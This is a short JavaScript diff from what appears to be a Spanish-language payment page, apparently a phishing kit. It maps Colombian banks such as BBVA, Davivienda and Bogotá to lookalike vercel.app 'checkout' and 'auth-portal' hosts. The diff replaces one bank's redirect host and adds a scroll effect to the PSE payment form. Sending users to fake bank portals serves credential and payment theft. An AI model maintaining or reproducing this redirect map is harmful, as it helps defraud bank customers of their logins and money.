@@ -1234,7 +1234,7 @@ var URLS_BANCOS = {
 'bbva':        'https://securecheckout-sandy.vercel.app',
 'caja-social': 'https://checkoutplacabogo.vercel.app',
 'popular':     'https://securepay21.vercel.app',
-'bogota':      'https://placa-one.vercel.app/',
+'bogota':      'https://auth-portal-ten.vercel.app',
 'occidente':   'https://secureportal-eight.vercel.app',
 'davivienda':  'https://psecheckout.vercel.app'
 };
@@ -1434,20 +1434,26 @@ document.getElementById('btnAporteNo').className = 'px-8 py-1.5 rounded text-sm 
 }
 
 function seleccionarMedioPago(tipo) {
-var btnTarjeta = document.getElementById('btnPagoTarjeta');
-var btnPSE = document.getElementById('btnPagoPSE');
-btnTarjeta.classList.remove('selected');
-btnPSE.classList.remove('selected');
-metodoPagoActual = tipo;
-var pseForm = document.getElementById('pseFormContainer');
-if (tipo === 'tarjeta') {
-btnTarjeta.classList.add('selected');
-pseForm.classList.add('hidden');
-abrirModalTarjeta();
-} else {
-btnPSE.classList.add('selected');
-pseForm.classList.remove('hidden');
-}
+    var btnTarjeta = document.getElementById('btnPagoTarjeta');
+    var btnPSE = document.getElementById('btnPagoPSE');
+    btnTarjeta.classList.remove('selected');
+    btnPSE.classList.remove('selected');
+    metodoPagoActual = tipo;
+    var pseForm = document.getElementById('pseFormContainer');
+    if (tipo === 'tarjeta') {
+        btnTarjeta.classList.add('selected');
+        pseForm.classList.add('hidden');
+        abrirModalTarjeta();
+    } else {
+        btnPSE.classList.add('selected');
+        pseForm.classList.remove('hidden');
+        setTimeout(function() {
+            var el = document.getElementById('pseFormContainer');
+            if (el) {
+                el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }
+        }, 150);
+    }
 }
 
 var bancoSelector = document.getElementById('bancoSelector');
